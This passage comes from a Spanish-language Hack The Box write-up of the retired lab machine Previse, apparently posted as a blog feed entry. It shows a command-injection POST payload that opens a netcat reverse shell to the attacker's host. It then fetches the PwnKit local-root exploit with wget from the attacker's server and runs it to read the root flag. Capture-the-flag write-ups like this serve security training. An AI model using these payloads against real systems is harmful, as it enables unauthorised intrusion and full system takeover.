&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Content-Description: File Transfer&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Content-Type: application/octet-stream&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Content-Disposition: attachment; filename=&quot;&apos;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Expires: 0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Cache-Control: must-revalidate&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Pragma: public&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Content-Length: &apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;filesize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;ob_clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Discard data in the output buffer&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Flush system headers&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;readfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;http_response_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos el comentario del Desarrollador y analizamos el codigo en busca de posible Vulnerabilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Command Injection&lt;/code&gt;, dado que vemnos la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$output = EXEC(&quot;Se Tenso&quot;)&lt;/code&gt;
Ahi tenemos un exec de un input que nosotros podemos modificar atraves del parametro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Delim&lt;/code&gt; Procedemos a hacer la siguiente Peticion por Post&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:78.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5
Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: &lt;span class=&quot;nv&quot;&gt;PHPSESSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;p79kvpmandld75npavcn0cra88
Upgrade-Insecure-Requests: 1

&lt;span class=&quot;s2&quot;&gt;&quot;delim=comma+%26%26+nc+10.10.16.4+443+-e+/bin/bash  &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos ponemos a la escucha con una session de nc&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# nc -vlnp 443                                                                                                                                                                                               1 ⚙&lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.16.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.11.104] 41780

    &lt;span class=&quot;c&quot;&gt;# script /dev/null -c bash&lt;/span&gt;
Script started, file is /dev/null

    &lt;span class=&quot;c&quot;&gt;# www-data@previse:/var/www/html$ ^Z&lt;/span&gt;
zsh: suspended  nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443

&lt;span class=&quot;c&quot;&gt;# stty raw -echo;fg                                                                                                                                                                                    148 ⨯ 2 ⚙&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]  - continued  nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
                              reset xterm

    &lt;span class=&quot;c&quot;&gt;# www-data@previse:/var/www/html$ export TERM=xterm&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# www-data@previse:/var/www/html$ export SHELL=bash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeracion de la Maquina y Aplicacion de Una escalada De Privilegios No Convecional&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@previse:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 
Linux &lt;span class=&quot;s2&quot;&gt;&quot;previse 4.15.0-151-generic&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;escalada-alternativa-a-root-pwnkit&quot;&gt;Escalada Alternativa a Root //&lt;strong&gt;PwnKit&lt;/strong&gt;//&lt;/h1&gt;

&lt;p&gt;Nos copiamos el siguiente Repositorio –&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;# git clone https://github.com/ly4k/PwnKit.git&lt;/code&gt;
Procdemos a montarnos un serividor con python3 para compartir el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PwnKit&lt;/code&gt; a la maquina victima&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@previse:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.16.4/PwnKit
&lt;span class=&quot;nt&quot;&gt;--2022-01-30&lt;/span&gt; 13:31:34--  http://10.10.16.4/PwnKit
Connecting to 10.10.16.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14688 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/octet-stream]
Saving to: &lt;span class=&quot;s1&quot;&gt;&apos;PwnKit&apos;&lt;/span&gt;

PwnKit              100%[&lt;span class=&quot;o&quot;&gt;===================&amp;gt;]&lt;/span&gt;  14.34K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.1s    

2022-01-30 13:31:34 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;125 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - &lt;span class=&quot;s1&quot;&gt;&apos;PwnKit&apos;&lt;/span&gt; saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14688/14688]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Verificando que tenemos el archivo, procedemos a darle permisos para ejecutarlo&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@previse:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;PwnKit  &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;www-data@previse:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x PwnKit 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ejecutamos el exploit PwnKit&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@previse:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./PwnKit 
root@previse:/tmp# &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Sacando la Flag para Root&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@previse:/tmp# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
root@previse:~# &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;root.txt
root@previse:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt 
xxxxxxxxdfadb7ab19dc709216xxxxxxxxx
root@previse:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Pwned Previse PwnKit OS Injection&lt;/p&gt;</content><author><name>K0Hack</name></author><category term="HTB," /><category term="Command" /><category term="Injection," /><category term="LFI," /><category term="Maquinas" /><category term="Retiradas," /><category term="Post-Explotacion." /><summary type="html">Previse ~ Hack The Box</summary></entry></feed>